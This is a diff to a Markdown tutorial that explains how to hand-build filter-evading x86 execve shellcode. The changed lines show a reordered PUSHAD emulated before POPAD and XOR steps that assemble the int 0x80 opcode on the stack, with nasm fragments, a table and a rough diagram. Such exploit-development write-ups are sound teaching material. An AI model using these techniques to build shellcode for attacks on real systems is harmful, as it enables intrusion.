@@ -170,7 +170,20 @@ dec eax
 push eax
 ```
 
-Now we have the basic elements for the execve, it's time to load everything in the registers using PUSHAD/POPAD. PUSHAD isn't in the table but POPAD is so what we need to do is to emulate a PUSHAD and then call a POPAD. PUSHAD is an instruction that load registers on the stack in this order: EDX, ECX, EBX, EAX, ESP, EBP, ESI, EDI.
+Now we have the basic elements for the execve, it's time to load everything in the registers using PUSHAD/POPAD. PUSHAD isn't in the table but POPAD is so what we need to do is to emulate a PUSHAD and then call a POPAD. PUSHAD is an instruction that load registers on the stack in this order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, and EDI
+Our PUSHAD is a little bit different: EDX, ECX, EBX, EAX, ESP, EBP, ESI, EDI. In this manner when we call POPAD we will put all the things in the right places.
+
+|PUSHAD instruction | Personilized PUSHAD instruction | 
+|-------------------|---------------------------------|
+|PUSH EAX |PUSH EDX (0x0)|
+|PUSH ECX |PUSH ECX|
+|PUSH EDX |PUSH EBX|
+|PUSH EBX |PUSH EAX (%esp)|
+|PUSH ESP |PUSH ESP|
+|PUSH EBP |PUSH EBP|
+|PUSH ESI |PUSH ESI|
+|PUSH EDI |PUSH EDI|
+
 So let's prepare the code:
 
 ```nasm
@@ -197,7 +210,7 @@ xor al, 0x4a
 xor al, 0x41
 ```
 Now remain the last and the most tedious thing. The ```int 0x80``` syscall that trig our shellcode. We can't use the int instruction so we need to invent another trick.
-The ```int 0x80``` has the opcode ```0xcd 0x80``` so we can save the opcode in the stack and jump in that place to trig the syscall. To do that we can use some binery maths and another technique:
+The ```int 0x80``` has the opcode ```0xcd 0x80``` so we can save the opcode in the stack and jump in that place to trig the syscall. To do that we can use some binary maths and another technique:
 - starting from EAX xored to 0
 - decrement EAX by 1 to obtain 0xffffffff
 - xor AX with 0x4f73
@@ -205,13 +218,32 @@ The ```int 0x80``` has the opcode ```0xcd 0x80``` so we can save the opcode in t
 - obtain 0xffff80cd
 - push EAX on the stack
 
+```bin
+11111111 11111111 - Begin
+01000001 00110000 – XOR #1
+10111110 11001111 – Result of XOR #1
+01110011 01001111 – XOR #2
+11001101 10000000 - Result of XOR #2 ($0xcd & $0x80)
+```
+
 ```nasm
 dec eax         ; 0xffffffff in EAX
 xor ax, 0x4f73  ;
 xor ax, 0x3041  ; 0xffff80cd in EAX
 push eax        ; put it on the stack
 ```
-The last problem to solve is that 0xffff80cd must be called as last instruction so living in little endian we need to push the value as first thing.
+The last problem to solve is that 0xffff80cd must be called as last instruction so living in little endian we need to push the value as first thing. We can summerize the execution with this schema
+
+```ascii
+     NOP
+ ------------------------------------------
+|        |                     |
+-----------------------------------------------------------------------------------------
+         |_____________________|
+          reconstrucion shellcode
+          
+
+```
 
 ## The Shellcode
 
